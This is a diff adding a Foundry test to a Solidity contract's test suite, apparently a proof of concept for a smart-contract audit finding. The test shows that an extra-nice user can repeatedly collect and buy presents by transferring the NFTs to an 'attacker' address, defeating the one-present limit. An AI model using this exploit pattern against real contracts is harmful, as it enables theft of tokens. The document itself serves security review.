@@ -192,4 +192,25 @@ contract SantasListTest is Test {
 
         assertEq(santasList.balanceOf(attacker), 1);
     }
+
+    function testExtraNicePeopleCanMintUnlimitedAmountsOfPresentsAndTokens() public {
+        address attacker = makeAddr("attacker");
+        vm.startPrank(santa);
+        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
+        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
+        vm.stopPrank();
+        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
+        vm.startPrank(user);
+        santasList.collectPresent();
+        santasList.buyPresent(user);
+        santasList.safeTransferFrom(user, attacker, 0);
+        santasList.safeTransferFrom(user, attacker, 1);
+        santasList.collectPresent();
+        santasList.buyPresent(user);
+        santasList.safeTransferFrom(user, attacker, 2);
+        santasList.safeTransferFrom(user, attacker, 3);
+        vm.stopPrank();
+
+        assertEq(santasList.balanceOf(attacker), 4);
+    }
 }
